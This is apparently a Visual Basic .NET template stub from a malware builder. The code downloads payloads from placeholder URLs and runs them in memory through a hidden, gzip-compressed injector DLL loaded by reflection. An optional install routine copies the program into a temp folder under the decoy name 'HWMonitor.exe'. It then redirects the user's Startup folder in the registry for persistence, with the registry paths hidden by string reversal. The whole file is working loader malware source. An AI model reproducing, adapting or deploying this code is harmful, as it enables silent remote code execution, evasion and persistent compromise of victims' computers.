'--------------------------------
'Nyan Cat 09/23/2018
'https://github.com/NYAN-x-CAT/
'--------------------------------

Imports System.IO
Imports System
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Windows.Forms
Imports System.Threading
Imports Microsoft.VisualBasic

'%ASSEMBLY%<Assembly: AssemblyTitle("%Title%")> 
'%ASSEMBLY%<Assembly: AssemblyDescription("%Description%")> 
'%ASSEMBLY%<Assembly: AssemblyCompany("%Company%")> 
'%ASSEMBLY%<Assembly: AssemblyProduct("%Product%")> 
'%ASSEMBLY%<Assembly: AssemblyCopyright("%Copyright%")> 
'%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
'%ASSEMBLY%<Assembly: AssemblyFileVersion("%v1%")> 



Public Class Main ''Thus I invoke myself!'' - Carl

    Public Shared Sub Main()
re:
        Dim request As Net.WebRequest = Net.WebRequest.Create("https://www.bing.com/")
        Try
            Dim response As Net.WebResponse = request.GetResponse()
        Catch ex As Exception
            Diagnostics.Debug.WriteLine(ex.Message)
            Threading.Thread.Sleep(5000)
            GoTo re
        End Try

        Try
            Dim URLS As String = "$URLS$"
            Dim SPL As String() = Split(URLS, "#$")
            For i As Integer = 0 To SPL.Length - 1
                If SPL(i) <> "" Then
                    Dim T As New Threading.Thread(AddressOf TheInvoker)
                    T.Start(SPL(i))
                    Threading.Thread.Sleep(1000)
                End If
            Next
        Catch ex As Exception
            Diagnostics.Debug.WriteLine(ex.Message)
        End Try

        '$INS$ Install()

    End Sub

    '$INS$    Private Shared Sub Install()
    '$INS$    Dim DropDirectory As String = IO.Path.Combine(IO.Path.GetTempPath, "HWMonitor")
    '$INS$   Dim DropFile As String = "/HWMonitor.exe"
    '$INS$   Dim DropLocation As String = IO.Path.Combine(IO.Path.GetTempPath, DropDirectory + DropFile)
    '$INS$
    '$INS$   Try
    '$INS$   If Not IO.Directory.Exists(DropDirectory) Then
    '$INS$               IO.Directory.CreateDirectory(DropDirectory)
    '$INS$ End If
    '$INS$
    '$INS$
    '$INS$   If Not Reflection.Assembly.GetExecutingAssembly.Location = DropLocation Then
    '$INS$               IO.File.Copy(Reflection.Assembly.GetExecutingAssembly.Location, DropLocation, True)
    '$INS$               Microsoft.Win32.Registry.CurrentUser.OpenSubKey(Fix("sredloF llehS resU\rerolpxE\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), True).SetValue("Startup", DropDirectory)
    '$INS$               Microsoft.Win32.Registry.CurrentUser.OpenSubKey(Fix("sredloF llehS\rerolpxE\noisreVtnerruC\swodniW\tfosorciM\erawtfoS"), True).SetValue("Startup", DropDirectory)
    '$INS$           End If
    '$INS$       Catch ex As Exception
    '$INS$            Diagnostics.Debug.WriteLine(ex.Message)
    '$INS$       End Try
    '$INS$  End Sub

    Private Shared Function Download(ByVal File As String) As Byte()
        Try
            Dim C As New Net.WebClient
            Return C.DownloadData(File)
        Catch ex As Exception
            Diagnostics.Debug.WriteLine(ex.Message)
            Return Nothing
        End Try
    End Function

    Private Shared Function TheInvoker(ByVal URL As String) As Object
        Try
            Dim r As New Random
            Return Reflection.Assembly.Load(LoadFile("$DLL$")).GetType("PE.Main").GetMethod("Run").Invoke(1 - 1, New Object() {r.Next(3).ToString, Nothing, Download(URL), True})
        Catch ex As Exception
            Diagnostics.Debug.WriteLine(ex.Message)
            Return Nothing
        End Try
    End Function

    Private Shared Function Fix(ByVal S As String) As String
        Return Strings.StrReverse(S)
    End Function

    Public Shared Function LoadFile(ByVal Get_ As String) As Byte()
        Dim MyAssembly As Assembly = Assembly.GetExecutingAssembly()
        Dim MyResource As New Resources.ResourceManager("$RES$", MyAssembly)
        Return UnGZip(MyResource.GetObject(Get_))
    End Function

    Public Shared Function UnGZip(ByVal B As Byte()) As Byte()
        Dim MS As New IO.MemoryStream(B)
        Dim Ziped As New IO.Compression.GZipStream(MS, IO.Compression.CompressionMode.Decompress)
        Dim buffer As Byte() = New Byte(4 - 1) {}
        MS.Position = (MS.Length - 5)
        MS.Read(buffer, 0, 4)
        Dim count As Integer = BitConverter.ToInt32(buffer, 0)
        MS.Position = 0
        Dim array As Byte() = New Byte(((count - 1) + 1) - 1) {}
        Ziped.Read(array, 0, count)
        Ziped.Dispose()
        MS.Dispose()
        Return array
    End Function

End Class
